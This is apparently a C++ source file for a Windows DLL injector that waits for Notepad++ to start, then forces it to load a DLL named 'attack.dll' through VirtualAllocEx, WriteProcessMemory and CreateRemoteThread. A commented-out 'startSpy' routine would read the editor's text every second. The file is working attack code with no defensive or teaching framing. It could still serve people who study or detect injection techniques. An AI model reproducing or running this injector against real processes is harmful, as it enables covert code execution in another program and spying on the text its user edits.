#include <windows.h>
#include <iostream>


void InjectDLL(DWORD pid, LPCSTR dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (NULL == hProcess) {
        printf("Process not found\n");
        return;
    }
    LPVOID lpAddr = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (lpAddr) {
        WriteProcessMemory(hProcess, lpAddr, dllPath, strlen(dllPath) + 1, NULL);
    }
    else {
        printf("VirtualAllocEx() failure.\n");
        return;
    }
    LPTHREAD_START_ROUTINE pfnLoadLibraryA = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (pfnLoadLibraryA) {
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pfnLoadLibraryA, lpAddr, 0, NULL);
        DWORD dwExitCode = NULL;
        if (hThread) {
            printf("Injection successful!\n");
            WaitForSingleObject(hThread, INFINITE);
            if (GetExitCodeThread(hThread, &dwExitCode)) printf("Injected DLL ImageBase: %#x\n", dwExitCode);
            CloseHandle(hThread);
        }
        else {
            printf("Injection failure.\n");
        }
    }
    VirtualFreeEx(hProcess, lpAddr, 0, MEM_RELEASE);
}

void startSpy(HWND hwnd) {
    printf("yeah~~");
    //char buffer[1024];
    //while (true) {
    //    HWND hEdit = FindWindowEx(hwnd, NULL, L"Scintilla", NULL);
    //    if (hEdit) {
    //        SendMessageA(hEdit, WM_GETTEXT, sizeof(buffer), (LPARAM)buffer);
    //        std::cout << buffer << std::endl;
    //    }
    //    Sleep(1000);
    //}
}

int main()
{
    const char* dllPath = "C:\\Users\\KOREA\\Desktop\\attack\\Release\\attack.dll";
    DWORD processID = 0;
    HWND hwnd;
    if (GetFileAttributesA(dllPath) == 0xffffffff) {
        printf("dll not found!\n");
        return 1;
    }
    printf("Looking for \"notepad++.exe\".......\n");
    while (1) {
        hwnd = FindWindow(L"Notepad++", NULL);
        if (hwnd)
        {
            GetWindowThreadProcessId(hwnd, &processID);
            InjectDLL(processID, dllPath);
            break;
        }
        Sleep(500);
    }
    //printf("say 'y' when you want to spy on the notepad++: ");
    //while (1) {
    //    char isY;
    //    scanf(" %c", &isY);
    //    if (isY == 'y') startSpy(hwnd);
    //    printf("say 'y' when you want to spy on the notepad++: ");
    //}
;
    return 0;
}
